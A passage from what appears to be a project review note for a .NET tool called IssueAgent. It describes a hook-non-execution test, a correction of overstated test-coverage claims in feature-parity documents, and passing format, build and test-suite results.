  hook-non-execution test (`GitLfsRunner.UploadObjectsAsync` against a worktree with executable
  `pre-push`/`post-checkout` hooks); and the "real OMP RPC" claims in `feature-parity.md` and
  `feature-parity-next-block.md` were corrected to state plainly that coverage exercises a scripted
  subprocess following this project's own protocol design, not the real pinned OMP binary — the
  residual risk remains documented in `OmpProcessClient.cs`.

Verification: `dotnet format IssueAgent.slnx --no-restore --verify-no-changes` passes; the full
solution build passes with zero warnings/errors; the complete test suite (246 tests across all 14
projects, including the new `IssueAgent.Security.Tests`) passes.

The checklist lines listed in §7 are re-earned by the fixes above and may remain `[x]`.
